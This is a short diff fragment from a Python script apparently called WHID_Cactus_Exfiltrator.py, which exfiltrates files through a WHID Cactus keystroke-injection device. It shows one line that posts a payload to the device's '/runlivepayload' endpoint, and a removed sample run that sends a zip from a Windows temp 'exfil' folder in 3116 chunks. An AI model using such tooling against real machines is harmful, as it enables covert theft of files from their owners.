@@ -134,14 +134,3 @@ requests.post(f"{url}/runlivepayload", data={"livepayload": to_send, "livepayloa
 
 
 print(f"FILE {filename} RECEIVED IN {int(time.time() - ts)} SEC.")
-
-
-"""
-
-
-
-
-[pgd@parrot ~]$ python3 WHID_Cactus_Exfiltrator.py C:\\Users\\PGD\\AppData\\Local\\Temp\\exfil\\exfil.zip
-Need to send 3116 chunks - this will take 73 minutes!
-LET THE WHID CACTUS DO IT's JOB - DONT USE IT TILL THE ESTIMATED TIME HAS PASSED!!!
-"""
